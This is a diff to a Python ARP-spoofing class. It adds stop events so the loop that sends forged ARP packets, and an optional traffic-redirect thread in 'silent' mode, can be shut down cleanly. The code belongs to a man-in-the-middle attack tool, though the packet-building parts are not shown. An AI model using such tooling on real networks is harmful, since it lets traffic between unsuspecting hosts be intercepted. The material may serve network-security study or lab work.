@@ -10,7 +10,7 @@ class ArpSpoofing():
     def __init__(self, intFace):
         self.interface = intFace
 
-    def doSpoof(self, target1, target2, target1MAC, target2MAC, oneway, silent, timeSleep):
+    def doSpoof(self, target1, target2, target1MAC, target2MAC, oneway, silent, timeSleep, stop_event):
 
         #This method obtains your own mac address
         def obtainMac():
@@ -56,11 +56,12 @@ class ArpSpoofing():
         print("Spoof Spoof")
         # if silent mode is enabled redirect the traffic to the correct receivers
         if silent == True:
+            stop_event2 = threading.Event()
             redirecting = TrafficRedirect(self.interface)
             try:
                 print("before thread")
                 redirect = threading.Thread(name="redirectThread", target=redirecting.doRedirect,
-                                            args=(target1, target2, target1MAC, target2MAC, oneway))
+                                            args=(target1, target2, target1MAC, target2MAC, oneway, stop_event2))
                 redirect.daemon = True
                 redirect.start()
                 print("after thread")
@@ -68,11 +69,15 @@ class ArpSpoofing():
                 print("Thread traffic redirect failed to start")
 
         time.sleep(timeSleep)
-        while True:
+        while not stop_event.is_set():
             for item in packetList:
                 sendp(item, iface=self.interface, verbose=False)
             print("Spoof Spoof")
             time.sleep(timeSleep)
+        if silent:
+            stop_event2.set()
+            redirect.join()
+
 
 
 
